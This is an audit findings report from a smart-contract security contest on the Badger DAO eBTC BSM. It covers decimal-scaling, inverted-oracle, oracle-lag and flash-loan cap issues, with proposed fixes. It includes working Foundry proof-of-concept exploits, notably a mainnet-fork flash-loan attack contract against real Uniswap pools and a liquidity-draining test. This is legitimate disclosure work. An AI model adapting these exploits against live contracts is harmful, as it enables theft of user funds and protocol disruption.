# Audit Findings – Badger DAO eBTC BSM

**Platform:** Cantina  
**Contest:** [badger-ebtc-bsm](https://cantina.xyz/competitions/f57ffb47-0ded-4f04-bcec-ecd7d47fad58)  
**Dates:** March 6, 2025 - March 13, 2025   
**Role:** Independent Security Researcher  
**Findings:** 2 High, 1 Medium, 1 Low

---

## 🛑 High Severity Findings

### H-01: `EbtcBSM` contract does not handle asset tokens with decimals other than 18

#### Description and impact
The `EbtcBSM` contract is intended to work with a variety of BTC-pegged tokens: several of these tokens do not use 18 decimal places but the contract is unable to handle these correctly, leading to direct loss of funds for users. The following are examples which all use 8 decimal places:

- cbBTC
- wBTC
- renBTC

The contract always exchanges these tokens at a 1 to 1 rate with eBTC which has 18 decimal places. Calls to sellAsset will receive a very small value of eBTC, and calls to buyAsset receive huge values of eBTC. As shown in the PoC below is it is possible for an attacker to exploit this to easily drain liquidity from the BSM at a significant profit.

The impact is high because:

1. Liquidity is drained causing DoS to other users.
1. The total supply of eBTC does not decrease much if the attacker executes the exploit, while the amount of the underlying asset decreases significantly. The attacker could potentially sell large amounts of eBTC causing a depeg.

Likelihood is high because it is immediately exploitable by any user.

#### Proof of Concept
Add another Solidity file under the test folder and copy the following into it:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "./BSMTestBase.sol";

contract DecimalsTests is BSMTestBase {
    function testBadDecimalsExploit() public {
        vm.prank(testMinter);
        // 1e8 assets, representing value of a single bitcoin as there are 8 decimal places for this token
        bsmTester.sellAsset(1e8, testMinter, 0);
        // Received 1e8 eBTC, representing value of 1e-10 bitcoin, which is essentially worthless
        assertEq(mockEbtcToken.balanceOf(testMinter), 1e8);

        address attacker = vm.addr(0xBEEF);
        deal(address(mockEbtcToken), attacker, 1e18);
        vm.startPrank(attacker);
        // The attacker spends 1e8 eBTC, representing value of 1e-10 bitcoin
        bsmTester.buyAsset(1e8, attacker, 0);

        // Attacker receives 1e8 assets, representing a value of 1 bitcoin having spent almost nothing
        assertEq(mockAssetToken.balanceOf(attacker), 1e8);
    }
}
```

Then run the test using:

```
forge test -vvv --match-test testBadDecimalsExploit
```

#### Recommended Mitigation Steps 

On EbtcBSM.sol:181, adjust the ebtcAmountOut so it is scaled appropriately:

```solidity
_ebtcAmountOut = (_assetAmountIn - _feeAmount) * 10 ** (18 - ASSET_TOKEN_DECIMALS);
```

`ASSET_TOKEN_DECIMALS` can be an immutable variable set in the constructor.

Also, on EbtcBSM.sol:221, scale amountIn and feeAmount as shown:

```solidity
 uint256 amountInScaled = _ebtcAmountIn / (10 ** (18 - ASSET_TOKEN_DECIMALS));
 uint256 feeAmountScaled = _feeAmount / (10 ** (18 - ASSET_TOKEN_DECIMALS));

 uint256 redeemedAmount = escrow.onWithdraw(amountInScaled);

_assetAmountOut = redeemedAmount - feeAmountScaled;
```

Note: the mitigation assumes no tokens with higher than 18 decimals.

**Submission details:** https://cantina.xyz/code/f57ffb47-0ded-4f04-bcec-ecd7d47fad58/findings/502

### H-02: Oracle price check is inverted

#### Description and impact
The oracle price check which occurs when minting eBTC is designed to ensure that if tBTC depegs downwards from BTC too much, then eBTC should not be mintable. The `tBTCChainlinkAdapter` returns the inverse of the required price, so the logic is inverted.

The ratio used to compute the price the price of tBTC relative to BTC has the numerator/denominator the wrong way around on tBTCChainlinkAdapter.sol:64.

Due to this, if the price of tBTC is lower than BTC, then the returned price is actually greater than 1e18. Therefore the Oracle price constraint will return true on OraclePriceConstraint.sol:82.

An attacker may do the following to exploit this:

1. Purchase tBTC at a price lower than BTC or eBTC.
1. Call sellAsset and receive eBTC in return for their tBTC.
1. Sell the eBTC at a profit.

This will put downward pressure on the eBTC price, likely causing it to depeg downwards.

The impact is high: the issue may cause distrust of the eBTC protocol if an eBTC depeg occurs and users may sell their eBTC at a loss.

The issue can only occur if tBTC depegs downwards which is not likely to happen often but is certainly possible.

#### Proof of Concept
Add the following imports to SellAssetTests.t.sol:

```solidity
import {MockAssetOracle} from "./mocks/MockAssetOracle.sol";
import {tBTCChainlinkAdapter, AggregatorV3Interface} from "../src/tBTCChainlinkAdapter.sol";
```

Then also add the following test function `SellAssetTests`:

```solidity
    function testSellAssetsDownardsDepeg() public {
        MockAssetOracle usdtBtcAggregator = new MockAssetOracle(8);
        MockAssetOracle btcUsdAggregator = new MockAssetOracle(8);
        tBTCChainlinkAdapter adapterAggreagator = new tBTCChainlinkAdapter(usdtBtcAggregator, btcUsdAggregator);
        OraclePriceConstraint adapterOraclePriceConstraint = new OraclePriceConstraint(address(adapterAggreagator), address(authority));
        setRoleCapability(
            15,
            address(adapterOraclePriceConstraint),
            adapterOraclePriceConstraint.setMinPrice.selector,
            true
        );

        vm.startPrank(techOpsMultisig);
        bsmTester.setOraclePriceConstraint(address(adapterOraclePriceConstraint));
        adapterOraclePriceConstraint.setMinPrice(9500);
        vm.stopPrank();

        usdtBtcAggregator.setLatestRoundId(111);
        usdtBtcAggregator.setPrice(90_000 * 1e8);
        usdtBtcAggregator.setUpdateTime(block.timestamp);

        btcUsdAggregator.setLatestRoundId(222);
        btcUsdAggregator.setPrice(100_000 * 1e8);
        btcUsdAggregator.setUpdateTime(block.timestamp);

        vm.expectPartialRevert(IMintingConstraint.MintingConstraintCheckFailed.selector);
        vm.prank(testMinter);
        bsmTester.sellAsset(1e18, testMinter, 0);
    }
```
Then run the test using:

```
forge test --match-test testSellAssetsDownardsDepeg -vv
```

This results in test failure as the sellAsset function does not revert.

#### Recommended Mitigation Steps

This issue can be fixed by inverting the ratio computed on tBTCChainlinkAdapter.sol:L64 as shown:

```
(BTC_USD_PRECISION * tBtcUsdPrice * ADAPTER_PRECISION) /
(btcUsdPrice * TBTC_USD_PRECISION);
```

**Submission details:** https://cantina.xyz/code/f57ffb47-0ded-4f04-bcec-ecd7d47fad58/findings/456

## ⚠️ Medium Severity Findings

### M-01: `tBTCChainlinkAdapter` does not account for one price feed lagging behind the other

#### Description and impact
On tBTCChainlinkAdapter.sol:108, the contract assigns the `updatedAt` to be the minimum of the two price feeds but does not consider if there is a significant difference difference in these two times. A difference is likely to occur as the tBTC feed is typically updated less frequently than BTC. These are the current configurations of the chainlink feeds:

tBTC trigger parameters (source: https://data.chain.link/feeds/ethereum/mainnet/tbtc-usd):

- Deviation threshold = 2%
- Heartbeat = 24 hours

BTC trigger parameters (source: https://data.chain.link/feeds/ethereum/mainnet/btc-usd):

- Deviation threshold = 0.5%
- Heartbeat = 1 hour

There is some mitigation for this issue already as OraclePriceConstraint:62 ensures that the minimum of the two `updatedAt` values of the feeds is within the desired limit, however this may not be sufficient in all cases.

These are some possible scenarios:

##### Scenario A

Due to the long heartbeat interval of tBTC it's likely that oracleFreshnessSeconds would need to be set quite high (i.e. close to 24 hours) in order to stop DoS in low volatility conditions (when tBTC feed won't be updated regularly). Although unlikely, it is possible that:

1. tBTC price feed stops getting updated for several hours due to an issue with chainlink.
1. BTC price feed continues to be updated, and the price does not fluctuate significantly.
1. While tBTCprice feed is not updated, a tBTC depeg occurs, causing the system requirement of approximate parity between tBTC and BTC to be broken.

##### Scenario B

There is a rapid market movement, and tBTC price feed continually lags behind. This might lead to situations where the depeg threshold is reached simply due to stale price data of tBTC, rather than an actual depeg (leading to temporary DoS). Additionally, it may be the case that a depeg is beginning to occur but the price difference since the last chainlink update is still less than the tBTC deviation threshold of 2%. There may be temporary periods where the depeg cannot be detected the protocol.

The impact is high because in scenario A above, the stale data and depeg cannot be detected by the contract. This could then lead to a depeg of eBTC itself, due to attackers exploiting the price difference between the 1 to 1 price provided by the BSM contract, and the price of tBTC on other markets.

For scenario B, the impact is low as the effects should be short-lived.

The likelihood is low as in scenario A, it requires an issue with chainlink. However we cannot assume chainlink is always available 100% of the time, and it has suffered issues such as a [6 hour ETH price feed delay in March 2020](https://cryptobriefing.com/chainlink-experiences-6-hour-delay-eth-price-feed/).

Scenario B is only possible in high volatility periods, so fairly unlikely.

#### Proof of Concept

The following test can be added to `SellAssetTests`:

```solidity
    function testSellAssetsPriceLag() public {
        vm.warp(1741737645);

        MockAssetOracle usdtBtcAggregator = new MockAssetOracle(8);
        MockAssetOracle btcUsdAggregator = new MockAssetOracle(8);
        tBTCChainlinkAdapter adapterAggreagator = new tBTCChainlinkAdapter(usdtBtcAggregator, btcUsdAggregator);
        OraclePriceConstraint adapterOraclePriceConstraint = new OraclePriceConstraint(address(adapterAggreagator), address(authority));
        setRoleCapability(
            15,
            address(adapterOraclePriceConstraint),
            adapterOraclePriceConstraint.setMinPrice.selector,
            true
        );

        vm.startPrank(techOpsMultisig);
        bsmTester.setOraclePriceConstraint(address(adapterOraclePriceConstraint));
        adapterOraclePriceConstraint.setMinPrice(9500);
        vm.stopPrank();

        usdtBtcAggregator.setLatestRoundId(111);
        usdtBtcAggregator.setPrice(100_000 * 1e8);
        usdtBtcAggregator.setUpdateTime(block.timestamp - 5 hours);

        btcUsdAggregator.setLatestRoundId(222);
        btcUsdAggregator.setPrice(102_000 * 1e8);
        btcUsdAggregator.setUpdateTime(block.timestamp - 5 minutes);

        vm.prank(testMinter);
        bsmTester.sellAsset(1e18, testMinter, 0);
    }

```

The `sellAsset` function does not revert even though there is a significant difference in updateTime between the two feeds.

#### Recommendation
It is difficult to mitigate the issue completely as fundamentally the updates to the two feeds will naturally occur at different frequencies due to the different deviation thresholds and heartbeats. One option would be to consider using WBTC instead of tBTC as its chainlink feed has a lower deviation threshold, and so should be updated more often. In addition to this, another check within the code could be added to compare the updatedAt times of two feeds and ensure they are not too far apart. The threshold for this would need to be carefully tuned to avoid DoS.

**Submission details:** https://cantina.xyz/code/f57ffb47-0ded-4f04-bcec-ecd7d47fad58/findings/466

## 🟦 Low Severity Findings

### L-01: Flash loan can be used to increase BSM totalMinted to the cap causing DoS

Please note: the PoC has been slightly modified from the original submission to demonstrate a more cost-effective attack path.

#### Description and impact
A malicious user could potentially use a flash loan in order to mint a large quantity of eBTC so that the `totalMintedAmount` is large enough to prevent further minting as the cap is reached.

An attacker could execute the following steps in a single transaction in order to temporarily prevent any further minting of eBTC through the BSM contract.

1. Take out a flash loan of tBTC
1. Call sellAsset on the BSM, causing totalMintedAmount to be increased
1. Use uniswap to convert eBTC back to DAI
1. Repay flash loan

Further calls to `sellAsset` will fail due to the supply cap check in the `RateLimitingConstraint` being reached.

They will incur the uniswap fees and slippage costs, as well as the sell fee on the BSM. A highly motivated attacker may still take the risk to sabotage the protocol.

The protocol can only be unblocked by governance intervention to increase the minting cap on the BSM contract, or by spending eBTC tokens on calling `buyAsset`.

This issue will cause a temporary DoS impact for users as they will not be able to call sellAsset. There may be further impacts as each time an attacker executes the exploit, it may be necessary to increase the minting cap for the BSM to unblock the protocol. This could gradually increase the supply of tokens minted through the BSM to a large amount, possibly to a point where even by increasing the relativeCapBPS on RateLimitingConstraints:84, it still won't be enough as the `relativeCapBPS `is prevented from going higher than 100%. This would cause further disruption, make the protocol overly exposed to tBTC depeg events, and may also allow an attacker to put downward pressure on the eBTC price due to the increase eBTC supply.

The likelihood was originally submitted as medium, but I accept the judge's argument that the likelihood is lower than that. A loss to the attacker is likely, it may in practice not be so high to dissuade a highly motivated attacker. Additionally, in the event of a upward depeg of eBTC, the attacker may be able to recoup these fees by selling the minted eBTC for a profit.

#### Proof of Concept
To run the PoC, start by modifying the `BSMTestBase::setup `function as shown:

```solidity
function setUp() public virtual {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createFork(rpcUrl);
    vm.selectFork(forkId);
    vm.rollFork(22028386);

    // To make testing easier, we allow any function to be called
    vm.mockCall(address(0x2A095d44831C26cFB6aCb806A6531AE3CA32DBc1), abi.encodeWithSelector(RolesAuthority.canCall.selector), abi.encode(true));

    BSMBase.baseSetup();
}
```

and add the import at the top of the file: `import "../src/Dependencies/RolesAuthority.sol";`

Then modify the `BSMTest::baseSetup` function:

```solidity
function baseSetup() internal virtual {
    defaultGovernance = vm.addr(0x123456);
    defaultFeeRecipient = vm.addr(0x234567);
    authority = Governor(0x2A095d44831C26cFB6aCb806A6531AE3CA32DBc1); // mainnet authority

    mockAssetToken = ERC20Mock(0x18084fbA666a33d37592fA2633fD49a74DD93a88); // tBTC
    mockEbtcToken = ERC20Mock(address(0x661c70333AA1850CcDBAe82776Bb436A0fCfeEfB));
    mockActivePoolObserver = MockActivePoolObserver(0x6dBDB6D420c110290431E863A1A978AE53F69ebC); // ActivePool
    externalVault = new ERC4626Mock(address(mockAssetToken));
    mockAssetOracle = new MockAssetOracle(18);
    oraclePriceConstraint = new OraclePriceConstraint(
        address(mockAssetOracle),
        address(authority)
    );
    rateLimitingConstraint = new RateLimitingConstraint(
        address(mockActivePoolObserver),
        address(authority)
    );
    testMinter = vm.addr(0x11111);
    testBuyer = vm.addr(0x22222);
    testAuthorizedUser = vm.addr(0x33333);
    techOpsMultisig = 0x690C74AF48BE029e763E61b4aDeB10E06119D3ba;

    bsmTester = new EbtcBSM(
        address(mockAssetToken),
        address(oraclePriceConstraint),
        address(rateLimitingConstraint),
        address(mockEbtcToken),
        address(authority)
    );

    escrow = new ERC4626Escrow(
        address(externalVault),
        address(mockAssetToken),
        address(bsmTester),
        address(authority),
        address(defaultFeeRecipient)
    );
    
    bsmTester.initialize(address(escrow));

    // create initial ebtc supply
    mockEbtcToken.mint(defaultGovernance, 50e18);
    mockAssetOracle.setPrice(1e18);
    mockAssetOracle.setUpdateTime(block.timestamp);

    vm.prank(testMinter);
    mockAssetToken.approve(address(bsmTester), type(uint256).max);

    vm.prank(testAuthorizedUser);
    mockAssetToken.approve(address(bsmTester), type(uint256).max);
    vm.prank(testAuthorizedUser);
    mockEbtcToken.approve(address(bsmTester), type(uint256).max);

    mockEbtcToken.mint(testAuthorizedUser, 10e18);

    mockEbtcToken.mint(testBuyer, 10e18);

    // give eBTC minter and burner roles to BSM tester
    setUserRole(address(bsmTester), 1, true);
    setUserRole(address(bsmTester), 2, true);
    setRoleName(15, "BSM: Governance");
    setRoleName(16, "BSM: AuthorizedUser");
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.setFeeToBuy.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.setFeeToSell.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.updateEscrow.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.pause.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.unpause.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.setOraclePriceConstraint.selector,
        true
    );
    setRoleCapability(
        15,
        address(bsmTester),
        bsmTester.setRateLimitingConstraint.selector,
        true
    );
    setRoleCapability(
        15,
        address(escrow),
        escrow.claimProfit.selector,
        true
    );
    setRoleCapability(
        15,
        address(escrow),
        escrow.depositToExternalVault.selector,
        true
    );
    setRoleCapability(
        15,
        address(escrow),
        escrow.redeemFromExternalVault.selector,
        true
    );
    setRoleCapability(
        15,
        address(oraclePriceConstraint),
        oraclePriceConstraint.setMinPrice.selector,
        true
    );
    setRoleCapability(
        15,
        address(oraclePriceConstraint),
        oraclePriceConstraint.setOracleFreshness.selector,
        true
    );
    setRoleCapability(
        15,
        address(rateLimitingConstraint),
        rateLimitingConstraint.setMintingConfig.selector,
        true
    );
    // Give ebtc tech ops role 15
    setUserRole(techOpsMultisig, 15, true);
    setRoleCapability(
        16,
        address(bsmTester),
        bsmTester.sellAssetNoFee.selector,
        true
    );
    setRoleCapability(
        16,
        address(bsmTester),
        bsmTester.buyAssetNoFee.selector,
        true
    );
    // Give authorizedUser role 16
    setUserRole(testAuthorizedUser, 16, true);

    // Set minting cap to 10%
    vm.prank(techOpsMultisig);
    rateLimitingConstraint.setMintingConfig(address(bsmTester), RateLimitingConstraint.MintingConfig(1000, 0, false));
}
```

Add a new Solidity file in the test directory with the following contents:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "./BSMTestBase.sol";
import {IEbtcBSM} from "../src/Dependencies/IEbtcBSM.sol";

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IUniswapV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract Minter {
    ISwapRouter private constant UNISWAP_V3_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant EBTC = 0x661c70333AA1850CcDBAe82776Bb436A0fCfeEfB;
    address private constant TBTC = 0x18084fbA666a33d37592fA2633fD49a74DD93a88;
    address private constant TBTC_WBTC_POOL = 0xdBAc78BE00503d10ae0074e5E5873a61fc56647c;

    IEbtcBSM private immutable bsm;
    address private attackerWallet;

    constructor(address _bsm) {
        bsm = IEbtcBSM(_bsm);
        IERC20(TBTC).approve(_bsm, type(uint256).max);
        IERC20(WBTC).approve(address(UNISWAP_V3_ROUTER), type(uint256).max);
        IERC20(EBTC).approve(address(UNISWAP_V3_ROUTER), type(uint256).max);
        IERC20(TBTC).approve(address(UNISWAP_V3_ROUTER), type(uint256).max);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        require(msg.sender == TBTC_WBTC_POOL);

        uint256 tbtcReceived = abi.decode(data, (uint256));

        uint256 ebtcReceived = bsm.sellAsset(tbtcReceived, address(this), 0); // Slippage protection could be added

        // Swap EBTC -> WBTC
        ISwapRouter.ExactInputSingleParams memory eBtcWbtcParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: EBTC,
            tokenOut: WBTC,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: ebtcReceived,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        uint256 wbtcReceived = UNISWAP_V3_ROUTER.exactInputSingle(eBtcWbtcParams);

        // Swap WBTC -> TBTC
        ISwapRouter.ExactInputSingleParams memory wbtcTbtcParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: WBTC,
            tokenOut: TBTC,
            fee: 100,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: wbtcReceived,
            amountOutMinimum: 0, // Slippage protection could be added
            sqrtPriceLimitX96: 0
        });

        uint256 tbtcReceivedFromSwap = UNISWAP_V3_ROUTER.exactInputSingle(wbtcTbtcParams);

        // Attacker pays the fee
        IERC20(TBTC).transferFrom(attackerWallet, msg.sender, tbtcReceived + fee0 - tbtcReceivedFromSwap);

        IERC20(TBTC).transfer(msg.sender, tbtcReceivedFromSwap);

        delete attackerWallet;
    }

    // Take a flash of this amount of tBTC and sell it to the BSM
    function mint(uint256 amount) public {
        attackerWallet = msg.sender;
        IUniswapV3Pool(TBTC_WBTC_POOL).flash(address(this), amount, 0, abi.encode(amount));
    }
}

contract AttackTest is BSMTestBase {
    function testSellAssetFlashLoan() public {
        // Fetch current supply minted by the ActivePool for logging
        uint256 observedValue = mockActivePoolObserver.observe();
        emit log_named_uint("ActivePoolObserver returned value", observedValue);

        // Deploy attack contract
        Minter minter = new Minter(address(bsmTester));
        address tbtc = 0x18084fbA666a33d37592fA2633fD49a74DD93a88;
        IERC20(tbtc).approve(address(minter), type(uint256).max);

        // The attacker needs some tBTC to be able pay the flash loan fee
        uint256 initTbtcBalance = 1e18;
        deal(tbtc, address(this), initTbtcBalance);
        assertEq(IERC20(tbtc).balanceOf(address(this)), initTbtcBalance);
        minter.mint(observedValue / 10);

        emit log_named_uint("Total minted amount", bsmTester.totalMinted());
        emit log_named_uint("Loss to the attacker in TBTC", initTbtcBalance - IERC20(tbtc).balanceOf(address(this)));

        // Check that very small mints cannot be executed
        address alice = makeAddr("alice");
        deal(address(mockAssetToken), alice, 10e18);
        vm.startPrank(alice);
        mockAssetToken.approve(address(bsmTester), type(uint256).max);
        vm.expectPartialRevert(IMintingConstraint.MintingConstraintCheckFailed.selector);
        bsmTester.sellAsset(0.001e18, alice, 0);
    }
}
```

Run the test using:

```
forge test -vv --match-test testSellAssetFlashLoan
```

And these logs are produced:

```
ActivePoolObserver returned value: 43969489558274313425
Total minted amount: 4396948955827431342
Loss to the attacker in TBTC: 8174420159625838
```

(loss to the attacker is only 0.008 tBTC)

#### Recommendation
Consider using a time-weighted average value of the total amount minted by the BSM, rather than just the current value. This could help to smooth out the impact of large mints.

**Submission details:** https://cantina.xyz/code/f57ffb47-0ded-4f04-bcec-ecd7d47fad58/findings/518
